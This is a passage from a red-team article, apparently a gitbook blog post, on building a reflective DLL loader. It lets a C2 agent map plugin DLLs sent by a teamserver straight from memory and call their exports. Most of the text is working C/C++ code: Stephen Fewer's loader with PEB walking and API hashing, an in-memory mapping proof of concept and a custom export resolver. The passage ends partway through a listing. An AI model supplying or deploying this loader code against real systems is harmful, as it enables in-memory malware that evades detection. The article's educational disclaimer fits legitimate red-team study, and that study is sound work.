# https://racoten.gitbook.io/red-team-developments-and-operations

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#disclaimer)    Disclaimer

The material in this article is provided **for educational purposes only**. Mapping PE images from memory, implementing reflective loaders, and building plugin-style interfaces can be powerful techniques that **must only be used on systems you own or have explicit written permission to test**.

By using any ideas or code patterns described here, **you accept full responsibility** for complying with all applicable laws, contracts, and policies. The author and publisher **do not endorse or condone illegal activity** and **assume no liability** for misuse, loss, or damages.

To practice safely:

- Work in an **isolated lab** (offline VMs, snapshots, disposable accounts).

- Keep tests **scoped, logged, and authorized**.

- Prefer **well-documented, maintainable implementations** over “clever” evasion.

- Treat examples as **starting points**, not turnkey tools; review for correctness, security, and ethics before use.


## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#summary)    Summary

I’m going to show a practical way to map a PE DLL straight from memory and call its exported interface functions like hot-swappable plugins. The focus here is on being clear and repeatable: a stable plugin ABI, a predictable mapper, and a test flow you can run on a Friday night without cursing at your screen. To keep this article readable, longer listings stay as code blocks you can drop into your project when you’re ready for testing.

* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#table-of-contents)    Table of Contents

- Background

- The Idea

- The Journey



  - What is Reflective DLL Loading?

  - Where to start?

  - Reimplement the Technique

  - A Custom GetProcAddress

  - Mapper

  - Plugin ABI

  - Interface & exports

  - Example Module: Command Execution

  - Host Test Harness

  - Checklist for the harness:


- Extensions

- Going Forward

- Conclusions

- References


* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#background)    Background

I fell down this rabbit hole after a few chats about modular “hot plugin” designs (shoutout to @Jonathan Wallace’s TactixC2 threads), plus a lot of tinkering with Windows PE internals and community loaders. The endgame: ship a tiny, in-process mapper; fetch the right DLL when you need it; and call into a clean interface—rather than jumping blindly to a single entry point and hoping for the best.

This style keeps the resident footprint small and avoids spinning up helper processes for every action. In practice: the agent maps a DLL from bytes, resolves a handful of exports, constructs a plugin object, and runs `execute(task)` with a simple payload.

* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#the-idea)    The Idea

Here’s the flow I aim for:

1. The teamserver sends an instruction plus the matching plugin DLL bytes.

2. The agent maps that DLL from memory (custom mapper).

3. The agent locates exports (factory, init, exec, cleanup).

4. The agent constructs an `IPlugin` and calls `init → execute(task) → cleanup`.

5. Output goes wherever you’ve decided (console, buffers, whatever fits your world).


One important note: you’re replacing the **loader’s mapping** steps for _this_ in-memory image. You can still lean on OS APIs to satisfy that image’s imports. Think “a custom mapper for this module,” not “banish `LoadLibrary` forever.”

* * *

## [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#the-journey)    The Journey

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#what-is-reflective-dll-loading)    What is Reflective DLL Loading?

It’s basically the OS loader, but by hand: parse headers, copy sections, apply relocations, resolve imports, set protections, maybe run the DLLEntry—and do it all from a byte buffer you already have. Same puzzle, different pieces.

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#where-to-start)    Where to start?

First, let's look at Stephen Fewer's implementation from more than a decade ago. First, process exports for the functions the loader needs:

Copy

````
// STEP 1: process the kernels exports for the functions our loader needs...
// get the Process Enviroment Block

#ifdef WIN_X64
    uiBaseAddress = __readgsqword(0x60);
#else

#ifdef WIN_X86
    uiBaseAddress = __readfsdword(0x30);
#else WIN_ARM

    uiBaseAddress = *(DWORD*)((BYTE*)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);

#endif

#endif
    ULONG_PTR kernel32BaseAddress = (ULONG_PTR)NULL;

    // get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
    uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

    // get the first entry of the InMemoryOrder module list
    uiValueA = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;

    while (uiValueA)
    {
        // get pointer to current modules name (unicode string)
        uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;

        // set bCounter to the length for the loop
        usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
        // clear uiValueC which will store the hash of the module name
        uiValueC = 0;

        // compute the hash of the module name...
        do
        {
            uiValueC = ror((DWORD)uiValueC);
            // normalize to uppercase if the module name is in lowercase

            if (*((BYTE*)uiValueB) >= 'a')
                uiValueC += *((BYTE*)uiValueB) - 0x20;
            else
                uiValueC += *((BYTE*)uiValueB);
            uiValueB++;
        } while (--usCounter);

        // compare the hash with that of kernel32.dll
        if ((DWORD)uiValueC == KERNEL32DLL_HASH)
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            kernel32BaseAddress = uiBaseAddress;

            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            // get the VA of the export directory
            uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

            // get the VA for the array of name pointers
            uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);

            // get the VA for the array of name ordinals
            uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

            // Number of imports to resolve
            usCounter = 4;

            // loop while we still have imports to find
            while (usCounter > 0)
            {
                // compute the hash values for this function name
                dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));

                // if we have found a function we want we get its virtual address
                if (dwHashValue == LOADLIBRARYA_HASH
                    || dwHashValue == GETPROCADDRESS_HASH
                    || dwHashValue == VIRTUALALLOC_HASH
                    || dwHashValue == VIRTUALPROTECT_HASH
                    )
                {
                    // get the VA for the array of addresses
                    uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

                    // store this functions VA
                    if (dwHashValue == LOADLIBRARYA_HASH)
                        pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == GETPROCADDRESS_HASH)
                        pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == VIRTUALALLOC_HASH)
                        pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));
                    else if (dwHashValue == VIRTUALPROTECT_HASH)
                        pVirtualProtect = (VIRTUALPROTECT)(uiBaseAddress + DEREF_32(uiAddressArray));

                    // decrement our counter
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);

                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }
        else if ((DWORD)uiValueC == NTDLLDLL_HASH)
        {
            // get this modules base address
            uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

            // get the VA of the modules NT Header
            uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

            // uiNameArray = the address of the modules export directory entry
            uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            // get the VA of the export directory
            uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

            // get the VA for the array of name pointers
            uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);

            // get the VA for the array of name ordinals
            uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

            usCounter = 1;

            // loop while we still have imports to find
            while (usCounter > 0)
            {
                // compute the hash values for this function name
                dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));

                // if we have found a function we want we get its virtual address
                if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
                {
                    // get the VA for the array of addresses
                    uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                    // use this functions name ordinal as an index into the array of name pointers
                    uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

                    // store this functions VA
                    if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)
                        pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress + DEREF_32(uiAddressArray));

                    // decrement our counter
                    usCounter--;
                }

                // get the next exported function name
                uiNameArray += sizeof(DWORD);

                // get the next exported function name ordinal
                uiNameOrdinals += sizeof(WORD);
            }
        }

        // we stop searching when we have found everything we need.
        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache && pVirtualProtect)
            break;

        // get the next entry
        uiValueA = DEREF(uiValueA);
    }
    ```

Next, reserve and commit memory, copy headers, and prepare to fix up the image.

```c
// STEP 2: load our image into a new permanent location in memory...

    // get the VA of the NT Header for the PE to be loaded
    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    // allocate all the memory for the DLL to be loaded into. we can load at any address because we will
    // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
    uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    // we must now copy over the headers
    uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    uiValueB = uiLibraryAddress;
    uiValueC = uiBaseAddress;

    while (uiValueA--)
        *(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;

    // Set headers protection to Read only.
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)uiHeaderValue;
````

Load each section at its VirtualAddress and copy its raw bytes.

Copy

```
// STEP 3: load in all of our sections...

    // uiValueA = the VA of the first section
    uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

    // itterate through all sections, loading them into memory.
    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
    while (uiValueE--)
    {
        // uiValueB is the VA for this section
        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

        // uiValueC if the VA for this sections data
        uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

        // copy the section over
        uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

        while (uiValueD--)
            *(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;

        // get the VA of the next section
        uiValueA += sizeof(IMAGE_SECTION_HEADER);
    }
```

Walk the import table and write resolved addresses into the IAT.

Copy

```
// STEP 4: process our images import table...

    // uiValueB = the address of the import directory
    uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    // we assume their is an import table to process
    // uiValueC is the first entry in the import table
    uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

    // itterate through all imports
    while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
    {
        // use LoadLibraryA to load the imported module into memory
        uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

        // uiValueD = VA of the OriginalFirstThunk
        uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

        // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
        uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

        // itterate through all imported functions, importing by ordinal if no name present
        while (DEREF(uiValueA))
        {
            // sanity check uiValueD as some compilers only import by FirstThunk
            if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // get the VA of the modules NT Header
                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

                // uiNameArray = the address of the modules export directory entry
                uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

                // get the VA of the export directory
                uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

                // get the VA for the array of addresses
                uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

                // use the import ordinal (- export ordinal base) as an index into the array of addresses
                uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

                // patch in the address for this imported function
                DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
            }
            else
            {
                // get the VA of this functions import by name struct
                uiValueB = (uiBaseAddress + DEREF(uiValueA));

                // use GetProcAddress and patch in the address for this imported function
                DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
            }
            // get the next imported function
            uiValueA += sizeof(ULONG_PTR);
            if (uiValueD)
                uiValueD += sizeof(ULONG_PTR);
        }

        // get the next import
        uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }
```

Apply relocations appropriate to the target architecture.

Copy

```
// STEP 5: process all of our images relocations...


    // calculate the base address delta and perform relocations (even if we load at desired image base)
    uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

    // uiValueB = the address of the relocation directory
    uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // check if their are any relocations present
    if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
    {
        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
        uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

        // and we itterate through all entries...
        while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
        {
            // uiValueA = the VA for this relocation block
            uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

            // uiValueB = number of entries in this relocation block
            uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // uiValueD is now the first entry in the current relocation block
            uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

            // we itterate through all the entries in the current block...
            while (uiValueB--)
            {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we dont use a switch statement to avoid the compiler building a jump table
                // which would not be very position independent!
                if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
#ifdef WIN_ARM
                // Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug. Using /O1 instead avoids this problem.
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_ARM_MOV32T)
                {
                    register DWORD dwInstruction;
                    register DWORD dwAddress;
                    register WORD wImm;
                    // get the MOV.T instructions DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word)
                    dwInstruction = *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD));
                    // flip the words to get the instruction as expected
                    dwInstruction = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));
                    // sanity chack we are processing a MOV instruction...
                    if ((dwInstruction & ARM_MOV_MASK) == ARM_MOVT)
                    {
                        // pull out the encoded 16bit value (the high portion of the address-to-relocate)
                        wImm = (WORD)(dwInstruction & 0x000000FF);
                        wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
                        wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
                        wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
                        // apply the relocation to the target address
                        dwAddress = ((WORD)HIWORD(uiLibraryAddress) + wImm) & 0xFFFF;
                        // now create a new instruction with the same opcode and register param.
                        dwInstruction = (DWORD)(dwInstruction & ARM_MOV_MASK2);
                        // patch in the relocated address...
                        dwInstruction |= (DWORD)(dwAddress & 0x00FF);
                        dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
                        dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
                        dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
                        // now flip the instructions words and patch back into the code...
                        *(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset + sizeof(DWORD)) = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));
                    }
                }
#endif
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
                    *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
                    *(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

                // get the next entry in the current relocation block
                uiValueD += sizeof(IMAGE_RELOC);
            }

            // get the next entry in the relocation directory
            uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
        }
    }
```

Set final protections for headers and sections to mirror the PE’s intent.

Copy

```
//
    // Step 6: Adjust section permissions
    //

    // uiValueA = the VA of the first section
    uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

    uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

    while (uiValueE--)
    {
        // uiValueB is the VA for this section
        uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

        pVirtualProtect(
            (LPVOID)uiValueB,
            ((PIMAGE_SECTION_HEADER)uiValueA)->Misc.VirtualSize,
            translate_protect(((PIMAGE_SECTION_HEADER)uiValueA)->Characteristics),
            &oldProt
        );

        // get the VA of the next section
        uiValueA += sizeof(IMAGE_SECTION_HEADER);
    }
```

Optionally flush the instruction cache and, if this module depends on loader-driven init, invoke the entry point.

Copy

```
// STEP 9: call our images entry point
    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

    // call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
    // if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
    ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);
#else
    // if we are injecting an DLL via a stub we call DllMain with no parameter
    ((DLLMAIN)uiValueA)((HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL);
#endif
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#reimplement-the-technique)    Reimplement the Technique

My first sanity check was a small “map and call” PoC I found in ired.team—just enough to see each step work in isolation. The big insight: once the image lives in memory, you can walk its exports yourself and call them directly.

Copy

```
#include "pch.h"
#include <iostream>
#include <Windows.h>

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main()
{
	// get this module's image base address
	PVOID imageBase = GetModuleHandleA(NULL);

	// load DLL into memory
	HANDLE dll = CreateFileA("\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD64 dllSize = GetFileSize(dll, NULL);
	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
	DWORD outSize = 0;
	ReadFile(dll, dllBytes, dllSize, &outSize, NULL);

	// get pointers to in-memory DLL headers
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
	//LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// get delta between this module's image base and the DLL that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

	// copy over DLL image headers to the newly allocated space for the DLL
	std::memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// copy over DLL image sections to the newly allocated space for the DLL
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
	{
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		std::memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		section++;
	}

	// perform image base relocations
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size)
	{
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++)
		{
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
			{
				continue;
			}

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
			addressToPatch += deltaImageBase;
			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}

	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != NULL)
	{
		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);

		if (library)
		{
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}

		importDescriptor++;
	}

	// execute the loaded DLL
	DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

	CloseHandle(dll);
	HeapFree(GetProcessHeap(), 0, dllBytes);

	return 0;
}
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#a-custom-getprocaddress)    A Custom GetProcAddress

Since the OS loader didn’t register your mapped image like a normal module, you’ll want a tiny export walker over **your** base: read `IMAGE_EXPORT_DIRECTORY`, find the name, convert RVA → VA, return the pointer. Nothing fancy—just reliable.

Copy

```
void* GetExport(const HMODULE& mod, const char* name) {
    if (!mod.base) return nullptr;
    auto base = (uint8_t*)mod.base;

    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return nullptr;

    auto ed = (PIMAGE_EXPORT_DIRECTORY)(base + dir.VirtualAddress);
    auto names = (DWORD*)(base + ed->AddressOfNames);
    auto ords = (WORD*)(base + ed->AddressOfNameOrdinals);
    auto funs = (DWORD*)(base + ed->AddressOfFunctions);

    for (DWORD i = 0; i < ed->NumberOfNames; ++i) {
        const char* nm = (const char*)(base + names[i]);
        if (_stricmp(nm, name) == 0) {
            WORD ord = ords[i];
            DWORD rva = funs[ord];
            return (void*)(base + rva);
        }
    }
    return nullptr;
}
```

* * *

### [hashtag](https://racoten.gitbook.io/red-team-developments-and-operations\#mapper)    Mapper

A neat mapper returns the mapped base (your stand-in for `HMODULE`). It should:

- Validate DOS/NT headers

- Allocate `SizeOfImage`

- Copy headers + sections

- Apply relocations

- Resolve imports

- Set final protections

- Optionally flush the instruction cache


Copy

```
HMODULE MapImage(const uint8_t* dll, size_t dllSize) {
    HMODULE out{};

    if (!dll || dllSize < sizeof(IMAGE_DOS_HEADER)) return out;

    // Copy raw into temp buffer
    void* raw = VirtualAlloc(nullptr, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!raw) return out;
    std::memcpy(raw, dll, dllSize);

    auto dos = (PIMAGE_DOS_HEADER)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(raw, 0, MEM_RELEASE); return out; }

    auto nt = (PIMAGE_NT_HEADERS)((uint8_t*)raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { VirtualFree(raw, 0, MEM_RELEASE); return out; }

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    uint8_t* base = (uint8_t*)VirtualAlloc((LPVOID)nt->OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) base = (uint8_t*)VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) { VirtualFree(raw, 0, MEM_RELEASE); return out; }

    // Copy headers
    std::memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->SizeOfRawData == 0) continue;
        std::memcpy(base + sec->VirtualAddress,
            (uint8_t*)raw + sec->PointerToRawData,
            sec->SizeOfRawData);
    }

    // Relocations
